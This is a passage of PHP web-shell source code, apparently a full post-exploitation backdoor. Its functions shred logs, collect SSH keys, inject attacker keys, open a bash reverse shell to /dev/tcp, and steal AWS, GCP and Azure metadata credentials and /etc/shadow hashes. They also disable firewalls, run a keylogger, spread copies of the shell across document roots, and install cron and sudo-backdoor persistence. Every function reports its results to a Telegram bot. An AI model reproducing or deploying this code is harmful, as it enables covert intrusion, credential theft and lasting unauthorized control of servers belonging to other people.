                @shell_exec("dd if=/dev/zero of=" . escapeshellarg($hf) . " bs=1M count=1 2>/dev/null");
                @unlink($hf);
                $results[] = "$hf wiped";
            }
        }
    }
    @shell_exec('find /tmp -name "*.history" -exec shred -fuz {} \\; 2>/dev/null');
    @shell_exec('find /tmp -name "bash_history*" -exec shred -fuz {} \\; 2>/dev/null');
    $results[] = "/tmp histories cleaned";
    $msg = "LOG CLEANER RESULTS\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

function sshkeys() {
    global $botToken, $telegramUserId;
    $keys = [];
    $home_dirs = ['/root', '/home/*'];
    foreach ($home_dirs as $pattern) {
        $dirs = @glob($pattern);
        if ($dirs !== false) {
            foreach ($dirs as $dir) {
                $ssh_dir = $dir . '/.ssh';
                if (is_dir($ssh_dir)) {
                    $id_rsa = $ssh_dir . '/id_rsa';
                    $id_rsa_pub = $ssh_dir . '/id_rsa.pub';
                    $authorized = $ssh_dir . '/authorized_keys';
                    if (file_exists($id_rsa)) $keys[] = $id_rsa;
                    if (file_exists($id_rsa_pub)) $keys[] = $id_rsa_pub;
                    if (file_exists($authorized)) $keys[] = $authorized;
                }
            }
        }
    }
    if (!empty($keys)) {
        $msg = "SSH KEYS FOUND\n\n" . implode("\n", $keys);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "SSH Keys found"];
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "SSH KEYS - No keys found");
        return ['status' => 'info', 'message' => "No SSH keys found"];
    }
}

function inject_ssh_keys($publicKey = '') {
    global $botToken, $telegramUserId;
    if (empty($publicKey)) {
        $publicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD... (your public key here)';
    }
    $users = [];
    if (function_exists('shell_exec')) {
        $output = @shell_exec('ls /home 2>/dev/null');
        if ($output !== null) {
            $users = array_filter(explode("\n", trim($output)));
        }
        $users[] = 'root';
    }
    $injected = [];
    foreach ($users as $user) {
        $home = ($user === 'root') ? '/root' : "/home/$user";
        $sshDir = "$home/.ssh";
        if (!is_dir($sshDir)) @mkdir($sshDir, 0700, true);
        $authFile = "$sshDir/authorized_keys";
        if (is_writable($sshDir) || is_writable($authFile)) {
            $content = @file_get_contents($authFile) ?: '';
            if (strpos($content, $publicKey) === false) {
                @file_put_contents($authFile, $content . "\n" . $publicKey . "\n");
                @chmod($authFile, 0600);
                @chown($authFile, $user);
                $injected[] = $user;
            }
        }
    }
    $msg = "SSH KEYS INJECTED\n\nTotal users: " . count($injected) . "\n" . implode("\n", $injected);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $injected;
}

function reverseshell() {
    global $botToken, $telegramUserId;
    $action = isset($_GET['action']) ? $_GET['action'] : '';
    $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
    $port = isset($_GET['port']) ? $_GET['port'] : '';
    $result = [];
    if ($action === 'start' && !empty($ip) && !empty($port)) {
        $cmd = "nohup bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &";
        @shell_exec($cmd);
        $result[] = "Reverse shell started to $ip:$port";
        sendTelegramMessage($botToken, $telegramUserId, "REVERSE SHELL STARTED\n\nTarget: $ip:$port");
    } elseif ($action === 'stop' && !empty($port)) {
        @shell_exec("pkill -f 'bash -i >& /dev/tcp/.*$port' 2>/dev/null");
        $result[] = "Reverse shell on port $port stopped";
        sendTelegramMessage($botToken, $telegramUserId, "REVERSE SHELL STOPPED\n\nPort: $port");
    } elseif ($action === 'status') {
        $ps = @shell_exec("ps aux | grep 'bash -i' | grep -v grep");
        if (!empty($ps)) {
            $result[] = "Active shells:\n$ps";
            sendTelegramMessage($botToken, $telegramUserId, "REVERSE SHELL STATUS\n\n$ps");
        } else {
            $result[] = "No active reverse shells";
            sendTelegramMessage($botToken, $telegramUserId, "REVERSE SHELL STATUS\n\nNo active shells");
        }
    } else {
        $result[] = "Usage: start [ip] [port], stop [port], status";
    }
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function cloudcreds() {
    global $botToken, $telegramUserId;
    $results = [];
    $aws_metadata = @file_get_contents('http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null');
    if ($aws_metadata !== false) {
        $role = trim($aws_metadata);
        if (!empty($role)) {
            $creds = @file_get_contents("http://169.254.169.254/latest/meta-data/iam/security-credentials/$role 2>/dev/null");
            if ($creds !== false) {
                $results[] = "AWS IAM Credentials:";
                $results[] = $creds;
            }
        }
    }
    $token = @file_get_contents('http://169.254.169.254/latest/api/token 2>/dev/null', false, stream_context_create([
        'http' => ['method' => 'PUT', 'header' => 'X-aws-ec2-metadata-token-ttl-seconds: 21600']
    ]));
    if ($token !== false) {
        $role = @file_get_contents('http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null', false, stream_context_create([
            'http' => ['header' => "X-aws-ec2-metadata-token: $token"]
        ]));
        if ($role !== false) {
            $creds = @file_get_contents("http://169.254.169.254/latest/meta-data/iam/security-credentials/" . trim($role), false, stream_context_create([
                'http' => ['header' => "X-aws-ec2-metadata-token: $token"]
            ]));
            if ($creds !== false) {
                $results[] = "AWS IAM Credentials (IMDSv2):";
                $results[] = $creds;
            }
        }
    }
    $gcp_creds = @file_get_contents('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null', false, stream_context_create([
        'http' => ['header' => 'Metadata-Flavor: Google']
    ]));
    if ($gcp_creds !== false) {
        $results[] = "GCP Service Account Token:";
        $results[] = $gcp_creds;
    }
    $azure_creds = @file_get_contents('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ 2>/dev/null', false, stream_context_create([
        'http' => ['header' => 'Metadata: true']
    ]));
    if ($azure_creds !== false) {
        $results[] = "Azure Managed Identity Token:";
        $results[] = $azure_creds;
    }
    if (empty($results)) {
        $results[] = "No cloud credentials found";
        sendTelegramMessage($botToken, $telegramUserId, "CLOUD CREDENTIALS - No credentials found");
    } else {
        $msg = "CLOUD CREDENTIALS\n\n" . implode("\n", $results);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
    }
    return ['status' => 'success', 'message' => "Cloud credentials grabbed"];
}

function portscan() {
    global $botToken, $telegramUserId;
    $target = isset($_GET['target']) ? $_GET['target'] : 'localhost';
    $ports = isset($_GET['ports']) ? $_GET['ports'] : '22,80,443,3306,5432,8080,8443';
    $result = [];
    $port_list = explode(',', $ports);
    $open_ports = [];
    $nc = @shell_exec('which nc 2>/dev/null');
    foreach ($port_list as $p) {
        $p = trim($p);
        if (empty($p)) continue;
        if (!empty($nc)) {
            $cmd = "timeout 2 nc -zv $target $p 2>&1";
            $output = @shell_exec($cmd);
            if (strpos($output, 'succeeded') !== false || strpos($output, 'Connected') !== false) {
                $open_ports[] = $p;
            }
        } else {
            $cmd = "timeout 2 bash -c 'echo > /dev/tcp/$target/$p' 2>&1";
            @shell_exec($cmd);
            $check = @shell_exec("echo \$? 2>/dev/null");
            if (trim($check) === '0') {
                $open_ports[] = $p;
            }
        }
    }
    if (!empty($open_ports)) {
        $result[] = "Open ports on $target: " . implode(', ', $open_ports);
        foreach ($open_ports as $p) {
            $service = '';
            switch($p) {
                case '22': $service = 'SSH'; break;
                case '80': $service = 'HTTP'; break;
                case '443': $service = 'HTTPS'; break;
                case '3306': $service = 'MySQL'; break;
                case '5432': $service = 'PostgreSQL'; break;
                case '8080': $service = 'HTTP-Alt'; break;
                case '8443': $service = 'HTTPS-Alt'; break;
                case '6379': $service = 'Redis'; break;
                case '27017': $service = 'MongoDB'; break;
                default: $service = 'Unknown';
            }
            $result[] = "  Port $p: $service";
        }
        $msg = "PORT SCAN RESULTS\nTarget: $target\n\n" . implode("\n", $result);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "Port scan done"];
    } else {
        $msg = "PORT SCAN - No open ports found on $target";
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'info', 'message' => "No open ports found"];
    }
}

function create_ssh() {
    global $botToken, $telegramUserId;
    $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'sshuser_' . rand(1000,9999);
    $pass = isset($_GET['pass']) && !empty($_GET['pass']) ? $_GET['pass'] : bin2hex(random_bytes(8));
    $result = [];
    if (!isRoot()) {
        $result[] = "ERROR: Root access required";
        sendTelegramMessage($botToken, $telegramUserId, "SSH USER FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    $exists = @shell_exec("id $user 2>/dev/null");
    if (!empty(trim((string)$exists))) {
        $result[] = "ERROR: User '$user' already exists";
        sendTelegramMessage($botToken, $telegramUserId, "SSH USER FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    $cmd = "useradd -m -s /bin/bash $user 2>&1";
    $out = @shell_exec($cmd);
    if ($out !== null && (strpos($out, 'cannot') !== false || strpos($out, 'error') !== false)) {
        $result[] = "ERROR: " . trim($out);
        sendTelegramMessage($botToken, $telegramUserId, "SSH USER FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    @shell_exec("echo '$user:$pass' | chpasswd 2>&1");
    @shell_exec("usermod -aG sudo $user 2>&1");
    @shell_exec("usermod -aG wheel $user 2>&1");
    @shell_exec("mkdir -p /home/$user/.ssh 2>/dev/null");
    @shell_exec("chmod 700 /home/$user/.ssh 2>/dev/null");
    @shell_exec("chown -R $user:$user /home/$user/.ssh 2>/dev/null");
    $result[] = "SUCCESS: SSH User created";
    $result[] = "Username: $user";
    $result[] = "Password: $pass";
    $result[] = "SSH: ssh $user@localhost";
    sendTelegramMessage($botToken, $telegramUserId, "SSH USER CREATED\n\nUsername: $user\nPassword: $pass\nSSH: ssh $user@localhost");
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function create_rdp() {
    global $botToken, $telegramUserId;
    $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'rdpuser_' . rand(1000,9999);
    $pass = isset($_GET['pass']) && !empty($_GET['pass']) ? $_GET['pass'] : bin2hex(random_bytes(8));
    $result = [];
    if (!isRoot()) {
        $result[] = "ERROR: Root access required";
        sendTelegramMessage($botToken, $telegramUserId, "RDP USER FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    $xrdp = @shell_exec('which xrdp 2>/dev/null');
    if (empty(trim((string)$xrdp))) {
        $result[] = "WARNING: xrdp not installed";
    } else {
        $result[] = "xrdp installed";
    }
    $exists = @shell_exec("id $user 2>/dev/null");
    if (!empty(trim((string)$exists))) {
        $result[] = "ERROR: User '$user' already exists";
        sendTelegramMessage($botToken, $telegramUserId, "RDP USER FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    @shell_exec("useradd -m -s /bin/bash $user 2>&1");
    @shell_exec("echo '$user:$pass' | chpasswd 2>&1");
    @shell_exec("usermod -aG sudo $user 2>&1");
    @shell_exec("systemctl start xrdp 2>/dev/null");
    @shell_exec("systemctl enable xrdp 2>/dev/null");
    $result[] = "SUCCESS: RDP User created";
    $result[] = "Username: $user";
    $result[] = "Password: $pass";
    sendTelegramMessage($botToken, $telegramUserId, "RDP USER CREATED\n\nUsername: $user\nPassword: $pass");
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function create_ftp() {
    global $botToken, $telegramUserId;
    $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'ftp_' . rand(1000,9999);
    $pass = isset($_GET['pass']) && !empty($_GET['pass']) ? $_GET['pass'] : bin2hex(random_bytes(8));
    $home = isset($_GET['home']) && !empty($_GET['home']) ? $_GET['home'] : "/home/$user";
    $result = [];
    if (!isRoot()) {
        $result[] = "ERROR: Root access required";
        sendTelegramMessage($botToken, $telegramUserId, "FTP ACCOUNT FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    $exists = @shell_exec("id $user 2>/dev/null");
    if (!empty(trim((string)$exists))) {
        $result[] = "ERROR: User '$user' already exists";
        sendTelegramMessage($botToken, $telegramUserId, "FTP ACCOUNT FAILED\n\n" . implode("\n", $result));
        return ['status' => 'error', 'message' => implode("\n", $result)];
    }
    @shell_exec("useradd -m -d $home -s /bin/false $user 2>&1");
    @shell_exec("echo '$user:$pass' | chpasswd 2>&1");
    @shell_exec("chown -R $user:$user $home 2>/dev/null");
    @shell_exec("chmod 755 $home 2>/dev/null");
    @shell_exec("echo '$user' >> /etc/ftpusers 2>/dev/null");
    @shell_exec("systemctl restart vsftpd 2>/dev/null");
    @shell_exec("systemctl restart proftpd 2>/dev/null");
    $result[] = "SUCCESS: FTP Account Created";
    $result[] = "Username: $user";
    $result[] = "Password: $pass";
    sendTelegramMessage($botToken, $telegramUserId, "FTP ACCOUNT CREATED\n\nUsername: $user\nPassword: $pass");
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function backup() {
    global $botToken, $telegramUserId;
    if (!is_writable(__DIR__)) {
        sendTelegramMessage($botToken, $telegramUserId, "BACKUP FAILED\n\nDirectory not writable: " . __DIR__);
        return ['status' => 'error', 'message' => 'Directory not writable'];
    }
    $backup_file = __DIR__ . '/.' . basename(__FILE__) . '.bak';
    if (file_exists($backup_file)) @unlink($backup_file);
    $result = @copy(__FILE__, $backup_file);
    if ($result) {
        @chmod($backup_file, 0644);
        sendTelegramMessage($botToken, $telegramUserId, "BACKUP CREATED\n\nFile: $backup_file");
        return ['status' => 'success', 'message' => 'Backup created: ' . $backup_file];
    } else {
        $error = error_get_last();
        $err_msg = $error['message'] ?? 'Unknown error';
        sendTelegramMessage($botToken, $telegramUserId, "BACKUP FAILED\n\n$err_msg");
        return ['status' => 'error', 'message' => 'Failed to create backup: ' . $err_msg];
    }
}

function delete_backup() {
    global $botToken, $telegramUserId;
    $deleted = 0; $details = [];
    $patterns = [
        __DIR__ . '/.*\\.inc', __DIR__ . '/.*\\.bak', __DIR__ . '/.*\\.tmp',
        __DIR__ . '/.docroots_cache', __DIR__ . '/.domains_cache',
        '/tmp/*.inc', '/var/tmp/*.inc', '/dev/shm/*.inc'
    ];
    foreach ($patterns as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $f) {
                if (@unlink($f)) { $deleted++; $details[] = "Deleted: $f"; }
            }
        }
    }
    if (is_dir(__DIR__ . '/.cache')) {
        deleteDirectory(__DIR__ . '/.cache');
        $deleted++;
        $details[] = "Deleted: " . __DIR__ . '/.cache';
    }
    $msg = "BACKUP DELETED\n\n$deleted backup files deleted\n\n" . implode("\n", array_slice($details, 0, 20));
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => "$deleted backup files deleted"];
}

function auto_prepend_inject() {
    global $botToken, $telegramUserId, $CURRENT_SHELL;
    $results = [];
    $shellPath = __FILE__;
    $iniPaths = [
        '/etc/php.ini', '/etc/php/cli/php.ini', '/etc/php/apache2/php.ini',
        '/etc/php/php.ini', '/usr/local/lib/php.ini', '/usr/local/php/lib/php.ini',
        '/opt/php/php.ini'
    ];
    foreach ($iniPaths as $ini) {
        if (file_exists($ini) && is_writable($ini)) {
            $content = @file_get_contents($ini);
            if ($content && strpos($content, 'auto_prepend_file') === false) {
                @file_put_contents($ini, "\nauto_prepend_file = $shellPath\n", FILE_APPEND);
                $results[] = "$ini updated";
            }
        }
    }
    $roots = get_all_document_roots_cached();
    foreach ($roots as $root) {
        $userIni = $root . '/.user.ini';
        if (is_dir($root) && is_writable($root)) {
            $content = @file_get_contents($userIni) ?: '';
            if (strpos($content, 'auto_prepend_file') === false) {
                @file_put_contents($userIni, "auto_prepend_file = $shellPath\n", FILE_APPEND);
                @chmod($userIni, 0644);
                $results[] = "$userIni created/updated";
            }
        }
    }
    $msg = "AUTO PREPEND INJECT RESULTS\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

function clone_shell() {
    global $botToken, $telegramUserId;
    $targets = isset($_GET['targets']) ? explode(',', $_GET['targets']) : [];
    $result = [];
    if (empty($targets)) {
        $roots = get_all_document_roots_cached();
        foreach ($roots as $root) {
            if (is_dir($root) && is_writable($root)) {
                $targets[] = $root;
            }
        }
    }
    if (empty($targets)) {
        $result[] = "No writable targets found";
        sendTelegramMessage($botToken, $telegramUserId, "CLONE SHELL - No writable targets found");
        return ['status' => 'error', 'message' => 'No writable targets found'];
    }
    $myFile = __FILE__;
    $cloned = 0; $errors = [];
    foreach ($targets as $target) {
        $target = trim($target);
        if (empty($target)) continue;
        if (!is_dir($target)) { $errors[] = "Not a directory: $target"; continue; }
        if (!is_writable($target)) { $errors[] = "Not writable: $target"; continue; }
        $new_name = md5(rand() . time()) . '.php';
        $target_file = $target . '/' . $new_name;
        if (@copy($myFile, $target_file)) {
            @chmod($target_file, 0644);
            $result[] = "Cloned to: $target_file";
            $cloned++;
        } else {
            $errors[] = "Failed: $target";
        }
    }
    $msg = "CLONE SHELL RESULTS\n\n$cloned files cloned";
    if (!empty($errors)) $msg .= "\n\nErrors:\n" . implode("\n", $errors);
    if (!empty($result)) $msg .= "\n\nDetails:\n" . implode("\n", $result);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => "$cloned files cloned"];
}

function list_spread() {
    global $botToken, $telegramUserId;
    $found = [];
    $myFile = basename(__FILE__);
    $roots = get_all_document_roots_cached();
    foreach ($roots as $root) {
        $target = $root . '/' . $myFile;
        if (file_exists($target)) {
            $found[] = $target;
        }
    }
    if (!empty($found)) {
        $msg = "SPREAD LOCATIONS\n\n" . implode("\n", $found);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "Spread locations found"];
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "SPREAD LOCATIONS - No spread files found");
        return ['status' => 'info', 'message' => "No spread files found"];
    }
}

function cpanel_harvest() {
    global $botToken, $telegramUserId;
    $credentials = []; $scanned = [];
    if (file_exists('/etc/passwd')) {
        $passwd = @file('/etc/passwd');
        if ($passwd !== false) {
            $users = [];
            foreach ($passwd as $line) {
                $parts = explode(':', $line);
                if (count($parts) >= 3 && $parts[2] >= 1000 && $parts[2] < 65534) {
                    $users[] = $parts[0];
                }
            }
            if (!empty($users)) {
                $credentials[] = "Users: " . implode(', ', array_slice($users, 0, 10));
                $scanned[] = "/etc/passwd scanned";
            }
        }
    }
    if (file_exists('/etc/shadow') && is_readable('/etc/shadow')) {
        $shadow = @file('/etc/shadow');
        if ($shadow !== false) {
            $hashes = [];
            foreach ($shadow as $line) {
                $parts = explode(':', $line);
                if (count($parts) >= 2 && !empty($parts[1]) && $parts[1] != '*' && $parts[1] != '!') {
                    $hashes[] = $parts[0] . ':' . substr($parts[1], 0, 20) . '...';
                }
            }
            if (!empty($hashes)) {
                $credentials[] = "Password Hashes: " . implode(', ', array_slice($hashes, 0, 5));
                $scanned[] = "/etc/shadow scanned";
            }
        }
    }
    $token_locations = [
        '/root/.accesshash', '/root/.cpanel/whm_token', '/etc/cpanel/whm_token',
        '/var/cpanel/whm_token', '/usr/local/cpanel/whm_token',
        '/home/*/.cpanel/whm_token', '/home/*/.accesshash'
    ];
    foreach ($token_locations as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $file) {
                if (is_file($file) && is_readable($file)) {
                    $content = trim(@file_get_contents($file));
                    if (!empty($content) && strlen($content) > 10) {
                        $credentials[] = "Token WHM: $content (from $file)";
                        $scanned[] = "Token found at $file";
                    }
                }
            }
        }
    }
    $msg = "CPANEL HARVEST RESULTS\n\n";
    if (!empty($credentials)) {
        $msg .= "Credentials Found:\n";
        $msg .= implode("\n", array_slice($credentials, 0, 50));
        if (count($credentials) > 50) $msg .= "\n... and " . (count($credentials)-50) . " more";
    } else {
        $msg .= "No credentials found.";
    }
    $msg .= "\n\nScan Details:\n" . implode("\n", $scanned);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $credentials;
}

function firewall_killer() {
    global $botToken, $telegramUserId;
    $results = [];
    if (function_exists('shell_exec')) {
        @shell_exec('iptables -F 2>/dev/null');
        @shell_exec('iptables -X 2>/dev/null');
        @shell_exec('iptables -t nat -F 2>/dev/null');
        @shell_exec('iptables -t mangle -F 2>/dev/null');
        @shell_exec('iptables -P INPUT ACCEPT 2>/dev/null');
        @shell_exec('iptables -P OUTPUT ACCEPT 2>/dev/null');
        @shell_exec('iptables -P FORWARD ACCEPT 2>/dev/null');
        $results[] = "iptables flushed & default ACCEPT";
        @shell_exec('ufw --force disable 2>/dev/null');
        @shell_exec('systemctl stop ufw 2>/dev/null');
        @shell_exec('systemctl disable ufw 2>/dev/null');
        $results[] = "ufw stopped & disabled";
        @shell_exec('systemctl stop firewalld 2>/dev/null');
        @shell_exec('systemctl disable firewalld 2>/dev/null');
        @shell_exec('firewall-cmd --set-default-zone=trusted 2>/dev/null');
        @shell_exec('firewall-cmd --reload 2>/dev/null');
        $results[] = "firewalld disabled & zone=trusted";
        @shell_exec('csf -x 2>/dev/null');
        @shell_exec('csf -f 2>/dev/null');
        @shell_exec('systemctl stop csf 2>/dev/null');
        @shell_exec('systemctl disable csf 2>/dev/null');
        $results[] = "CSF disabled";
    }
    $msg = "FIREWALL KILLER RESULTS\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

function network_pivot() {
    global $botToken, $telegramUserId;
    $action = isset($_GET['action']) ? $_GET['action'] : '';
    $target = isset($_GET['target']) ? $_GET['target'] : '';
    $port = isset($_GET['port']) ? $_GET['port'] : '';
    $local_port = isset($_GET['local_port']) ? $_GET['local_port'] : '';
    $result = [];
    if ($action === 'ssh_tunnel' && !empty($target) && !empty($port) && !empty($local_port)) {
        $cmd = "ssh -L $local_port:localhost:$port $target -N -f 2>/dev/null";
        @shell_exec($cmd);
        $result[] = "SSH tunnel established: localhost:$local_port -> $target:$port";
        sendTelegramMessage($botToken, $telegramUserId, "NETWORK PIVOT - SSH TUNNEL\n\nLocal: localhost:$local_port -> Remote: $target:$port");
    } elseif ($action === 'ssh_dynamic' && !empty($target) && !empty($local_port)) {
        $cmd = "ssh -D $local_port $target -N -f 2>/dev/null";
        @shell_exec($cmd);
        $result[] = "SSH dynamic proxy: SOCKS5 on localhost:$local_port";
        sendTelegramMessage($botToken, $telegramUserId, "NETWORK PIVOT - SSH DYNAMIC\n\nSOCKS5 proxy on localhost:$local_port");
    } elseif ($action === 'reverse_tunnel' && !empty($target) && !empty($port) && !empty($local_port)) {
        $cmd = "ssh -R $port:localhost:$local_port $target -N -f 2>/dev/null";
        @shell_exec($cmd);
        $result[] = "Reverse tunnel: $target:$port -> localhost:$local_port";
        sendTelegramMessage($botToken, $telegramUserId, "NETWORK PIVOT - REVERSE TUNNEL\n\nRemote: $target:$port -> Local: localhost:$local_port");
    } elseif ($action === 'status') {
        $tunnels = @shell_exec("ps aux | grep -E 'ssh -[LD]|nc -l' | grep -v grep");
        if (!empty($tunnels)) {
            $result[] = "Active tunnels:\n$tunnels";
            sendTelegramMessage($botToken, $telegramUserId, "NETWORK PIVOT STATUS\n\n$tunnels");
        } else {
            $result[] = "No active tunnels";
            sendTelegramMessage($botToken, $telegramUserId, "NETWORK PIVOT STATUS\n\nNo active tunnels");
        }
    }
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function keylogger() {
    global $botToken, $telegramUserId;
    $action = isset($_GET['action']) ? $_GET['action'] : 'start';
    $result = [];
    $python = @shell_exec('which python3 2>/dev/null') ?: @shell_exec('which python 2>/dev/null');
    if (empty(trim((string)$python))) {
        return ['status' => 'error', 'message' => 'Python not installed'];
    }
    if ($action === 'start') {
        $py_code = '
import sys
import os
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    print("pynput not installed")
    sys.exit(1)

log_file = "/tmp/.keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except:
        with open(log_file, "a") as f:
            f.write(" " + str(key) + " ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
';
        @file_put_contents('/tmp/.keylogger.py', $py_code);
        $cmd = trim($python) . ' /tmp/.keylogger.py > /dev/null 2>&1 &';
        @shell_exec('nohup ' . $cmd);
        $result[] = "Keylogger started";
        $result[] = "Log file: /tmp/.keylog.txt";
        sendTelegramMessage($botToken, $telegramUserId, "KEYLOGGER STARTED\n\nLog file: /tmp/.keylog.txt");
    } elseif ($action === 'stop') {
        @shell_exec('pkill -f keylogger.py 2>/dev/null');
        @shell_exec('rm -f /tmp/.keylogger.py 2>/dev/null');
        $result[] = "Keylogger stopped";
        sendTelegramMessage($botToken, $telegramUserId, "KEYLOGGER STOPPED");
    } elseif ($action === 'read') {
        $log = @file_get_contents('/tmp/.keylog.txt');
        if ($log !== false && !empty($log)) {
            $result[] = "Keylog content:";
            $result[] = substr($log, -500);
            sendTelegramMessage($botToken, $telegramUserId, "KEYLOGGER READ\n\n" . substr($log, -500));
        } else {
            $result[] = "No keylog data";
            sendTelegramMessage($botToken, $telegramUserId, "KEYLOGGER READ - No data");
        }
    } elseif ($action === 'clear') {
        @unlink('/tmp/.keylog.txt');
        $result[] = "Keylog cleared";
        sendTelegramMessage($botToken, $telegramUserId, "KEYLOGGER CLEARED");
    }
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

function cron_persistence() {
    global $botToken, $telegramUserId;
    $action = isset($_GET['action']) ? $_GET['action'] : 'install';
    $interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 5;
    $result = [];
    if ($action === 'install') {
        $cron_jobs = [
            "*/$interval * * * * php " . __FILE__ . " > /dev/null 2>&1",
            "@reboot php " . __FILE__ . " > /dev/null 2>&1",
            "0 */6 * * * curl -s " . (isset($_SERVER['HTTP_HOST']) ? 'http://' . $_SERVER['HTTP_HOST'] . '/' . basename(__FILE__) : '') . " > /dev/null 2>&1",
            "*/15 * * * * wget -q -O- " . (isset($_SERVER['HTTP_HOST']) ? 'http://' . $_SERVER['HTTP_HOST'] . '/' . basename(__FILE__) : '') . " > /dev/null 2>&1"
        ];
        foreach ($cron_jobs as $job) {
            @shell_exec("(crontab -l 2>/dev/null; echo '$job') | crontab - 2>/dev/null");
        }
        if (isRoot()) {
            @file_put_contents('/etc/cron.d/shell_persistence', implode("\n", $cron_jobs) . "\n");
            @chmod('/etc/cron.d/shell_persistence', 0644);
        }
        $result[] = "Cron persistence installed";
        $result[] = "Interval: $interval minutes";
        sendTelegramMessage($botToken, $telegramUserId, "CRON PERSISTENCE INSTALLED\n\nInterval: $interval minutes\nReboot: enabled");
    } elseif ($action === 'remove') {
        @shell_exec("crontab -r 2>/dev/null");
        if (isRoot()) @unlink('/etc/cron.d/shell_persistence');
        $result[] = "Cron persistence removed";
        sendTelegramMessage($botToken, $telegramUserId, "CRON PERSISTENCE REMOVED");
    } elseif ($action === 'list') {
        $cron = @shell_exec('crontab -l 2>/dev/null');
        if (!empty($cron)) {
            $result[] = "Current cron jobs:";
            $result[] = $cron;
            sendTelegramMessage($botToken, $telegramUserId, "CRON PERSISTENCE LIST\n\n$cron");
        } else {
            $result[] = "No cron jobs found";
            sendTelegramMessage($botToken, $telegramUserId, "CRON PERSISTENCE - No cron jobs found");
        }
    } else {
        $result[] = "Usage: action=install|remove|list&interval=5";
    }
    return ['status' => 'success', 'message' => implode("\n", $result)];
}

if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    global $botToken, $telegramUserId;
    $action = isset($_GET['user_persistence']) ? $_GET['user_persistence'] : '';
    $result = [];
    if ($action === 'install') {
        if (!isRoot()) sendJsonResponse(['status' => 'error', 'message' => 'Root access required']);
        $user = 'syshelper_' . rand(1000,9999);
        $pass = bin2hex(random_bytes(8));
        @shell_exec("useradd -m -s /bin/bash $user 2>&1");
        @shell_exec("echo '$user:$pass' | chpasswd 2>&1");
        @shell_exec("echo '$user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers 2>/dev/null");
        @shell_exec("mkdir -p /home/$user/.ssh 2>/dev/null");
        @shell_exec("chmod 700 /home/$user/.ssh 2>/dev/null");
        @shell_exec("chown -R $user:$user /home/$user 2>/dev/null");
        $result[] = "User persistence installed";
        $result[] = "User: $user";
        $result[] = "Pass: $pass";
        $result[] = "Sudo: NOPASSWD";
        sendTelegramMessage($botToken, $telegramUserId, "USER PERSISTENCE INSTALLED\n\nUser: $user\nPassword: $pass\nSudo: NOPASSWD");
    } elseif ($action === 'remove') {
        $users = explode("\n", @shell_exec('grep -E "syshelper_|backdoor_|sshuser_|rdpuser_|ftp_" /etc/passwd | cut -d: -f1 2>/dev/null'));
        foreach ($users as $u) {
            if (!empty($u)) @shell_exec("userdel -r $u 2>/dev/null");
        }
        @shell_exec("sed -i '/syshelper_/d' /etc/sudoers 2>/dev/null");
        $result[] = "User persistence removed";
        sendTelegramMessage($botToken, $telegramUserId, "USER PERSISTENCE REMOVED");
    } else {
        $result[] = "Usage: install or remove";
    }
    sendJsonResponse(['status' => 'success', 'message' => implode("\n", $result)]);
}

if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    global $botToken, $telegramUserId;
    $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    clean_logs_aggressive();
    @shell_exec('pkill -f nc 2>/dev/null');
